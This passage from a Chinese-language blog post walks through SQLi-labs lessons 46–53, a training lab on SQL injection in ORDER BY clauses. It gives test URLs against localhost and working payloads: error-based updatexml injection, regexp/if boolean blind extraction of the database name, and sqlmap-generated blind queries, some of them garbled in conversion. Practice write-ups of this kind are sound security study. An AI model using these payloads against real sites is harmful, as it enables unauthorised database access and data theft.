<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p>
</blockquote>
<p>判断为字符型注入</p>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p>
</blockquote>
<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><h3 id="GET数字型的orderby从句盲注"><a href="#GET数字型的orderby从句盲注" class="headerlink" title="GET数字型的orderby从句盲注"></a>GET数字型的orderby从句盲注</h3><p>测试:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(%E6%97%A0%E5%9B%9E%E6%98%BE)">http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(无回显)</a></p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-48/?sort=0%20or%201=1%20%20--+%EF%BC%88%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%89">http://localhost/Less-48/?sort=0%20or%201=1%20%20--+（有回显）</a></p>
</blockquote>
<p>数字型</p>
<p>尝试了使用boolenBased注入。常规的boolenBased方式用不了，上网查了查</p>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00">http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00</a>“</p>
</blockquote>
<p>原理为1与<code>if</code>语句正则匹配，database()第一个字符&#x3D;0x73为真则if为1，则regexp匹配结果为1，否则为0。</p>
<p>sqlmap跑的payload：</p>
<blockquote>
<p>[<a target="_blank" rel="noopener" href="http://localhost/Less-48/?sort=(select%5D(http://localhost/Less-48/?sort=(select)">http://localhost/Less-48/?sort=(select](http://localhost/Less-48/?sort=(select)</a>“)(case when (7459&#x3D;7459) then 7459 else 7459 *(select 7459 from information_schema.plugins) end))</p>
</blockquote>
<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><h3 id="GET字符型orderby从句盲注"><a href="#GET字符型orderby从句盲注" class="headerlink" title="GET字符型orderby从句盲注"></a>GET字符型orderby从句盲注</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-49/?sort=0%20or%201=1">http://localhost/Less-49/?sort=0%20or%201=1</a>“</p>
</blockquote>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+">http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+</a>“</p>
</blockquote>
<p>sqlmap跑user()的盲注语句：</p>
<blockquote>
<ul>
<li>THEN 3452 ELSE 3452 _(SELECT 3452 FROM INFORMATION_SCHEMA.PLUGINS)<br>END))</li>
</ul>
</blockquote>
<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><h3 id="GET数字型orderby从句层次化查询注入"><a href="#GET数字型orderby从句层次化查询注入" class="headerlink" title="GET数字型orderby从句层次化查询注入"></a>GET数字型orderby从句层次化查询注入</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-50/?sort=0%27%20or%201=1%20--+">http://localhost/Less-50/?sort=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-50/?sort=0%20or%201=1%20--+">http://localhost/Less-50/?sort=0%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-50/?sort=0%20desc--+">http://localhost/Less-50/?sort=0%20desc--+</a>“</p>
</blockquote>
<p>判断为数字型orderby从句注入</p>
<p>payload同<code>Less46</code></p>
<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><h3 id="GET字符型orderby从句层次化查询注入"><a href="#GET字符型orderby从句层次化查询注入" class="headerlink" title="GET字符型orderby从句层次化查询注入"></a>GET字符型orderby从句层次化查询注入</h3><p>测试：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-51/?sort=0%27%20or%201=1%20--+">http://localhost/Less-51/?sort=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-51/?sort=0%20or%201=1%20--+">http://localhost/Less-51/?sort=0%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-51/?sort=0%27%20desc--+">http://localhost/Less-51/?sort=0%27%20desc--+</a>“</p>
</blockquote>
<p>单引号字符型orderby从句注入</p>
<p>payload同<code>Less-47</code></p>
<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><h3 id="GET数字型orderby从句层次化查询盲注"><a href="#GET数字型orderby从句层次化查询盲注" class="headerlink" title="GET数字型orderby从句层次化查询盲注"></a>GET数字型orderby从句层次化查询盲注</h3><p>测试:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-52/?sort=0%27%20or%201=1%20--+">http://localhost/Less-52/?sort=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-52/?sort=0%20or%201=1%20--+">http://localhost/Less-52/?sort=0%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-52/?sort=0%27%20desc--+">http://localhost/Less-52/?sort=0%27%20desc--+</a>“</p>
</blockquote>
<p>数字型orderby从句注入</p>
<p>payload同Less-48</p>
<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><h3 id="GET字符型orderby从句层次化查询盲注"><a href="#GET字符型orderby从句层次化查询盲注" class="headerlink" title="GET字符型orderby从句层次化查询盲注"></a>GET字符型orderby从句层次化查询盲注</h3><p>测试:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-53/?sort=0%27%20or%201=1%20--+">http://localhost/Less-53/?sort=0%27%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-53/?sort=0%20or%201=1%20--+">http://localhost/Less-53/?sort=0%20or%201=1%20--+</a>“</p>
<p><a target="_blank" rel="noopener" href="http://localhost/Less-53/?sort=0%27%20desc--+">http://localhost/Less-53/?sort=0%27%20desc--+</a>“</p>
</blockquote>
<p>字符型orderby从句注入</p>
<p>payload同Less-49</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这一部分中学到了一些<code>绕过注入</code>、<code>层次化查询注入</code>和<code>orderby从句注入</code>的一些思路。学到了很多东西，但是感觉这一部分的题目重复性有些偏大，套路有点单一。</p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




    <script src="https://giscus.app/client.js"
    data-repo="YYHYlh/YYHYlh.github.io"
    data-repo-id="R_kgDOJjKWvw"
    data-category="Announcements"
    data-category-id="DIC_kwDOJjKWv84CWs3N"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="preferred_color_scheme"
    data-lang="zh-CN"
    crossorigin="anonymous"
    async>
</script>




</html>
